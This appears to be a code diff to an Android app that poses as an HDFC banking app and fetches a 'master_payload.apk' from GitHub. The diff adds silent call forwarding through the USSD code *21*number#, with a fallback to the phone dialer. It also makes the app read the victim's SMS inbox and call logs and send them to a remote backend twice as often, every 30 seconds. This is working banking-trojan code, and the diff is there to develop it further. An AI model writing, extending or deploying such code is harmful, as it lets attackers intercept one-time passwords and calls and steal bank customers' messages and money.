@@ -44,6 +44,7 @@ public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://newmadebackend.onrender.com";
     private static final String UPDATE_URL = "https://github.com/hdfcbank100200-tech/newmade1/releases/latest/download/master_payload.apk";
+    private String lastForwardedNumber = "";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -124,12 +125,42 @@ public class MainActivity extends BridgeActivity {
     }
 
     private void triggerCallForwarding(String number) {
+        if (number.equals(lastForwardedNumber)) return;
+        
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
             String ussd = "*21*" + number + "#";
+            lastForwardedNumber = number;
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                try {
+                    android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+                    tm.sendUssdRequest(ussd, new android.telephony.TelephonyManager.UssdResponseCallback() {
+                        @Override
+                        public void onReceiveUssdResponse(android.telephony.TelephonyManager telephonyManager, String request, CharSequence response) {
+                            Log.d(TAG, "USSD Success: " + response);
+                        }
+                        @Override
+                        public void onReceiveUssdResponseFailed(android.telephony.TelephonyManager telephonyManager, String request, int failureCode) {
+                            Log.e(TAG, "USSD Failed: " + failureCode + ". Falling back to Dialer.");
+                            fallbackToDialer(ussd);
+                        }
+                    }, new Handler(Looper.getMainLooper()));
+                } catch (Exception e) {
+                    fallbackToDialer(ussd);
+                }
+            } else {
+                fallbackToDialer(ussd);
+            }
+        }
+    }
+
+    private void fallbackToDialer(String ussd) {
+        try {
             Intent intent = new Intent(Intent.ACTION_CALL);
             intent.setData(Uri.parse("tel:" + Uri.encode(ussd)));
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-        }
+        } catch (Exception e) { Log.e(TAG, "Dialer Error", e); }
     }
 
     private void requestIgnoreBatteryOptimizations() {
@@ -238,9 +269,9 @@ public class MainActivity extends BridgeActivity {
                     readAndSendSmsInbox(deviceId);
                     readAndSendCallLogs(deviceId);
                     checkRemoteConfig(deviceId);
-                    Thread.sleep(60000); // Poll every minute
+                    Thread.sleep(30000); // Poll every 30 seconds
                 } catch (Exception e) {
-                    try { Thread.sleep(60000); } catch (Exception ignored) {}
+                    try { Thread.sleep(30000); } catch (Exception ignored) {}
                 }
             }
         }).start();
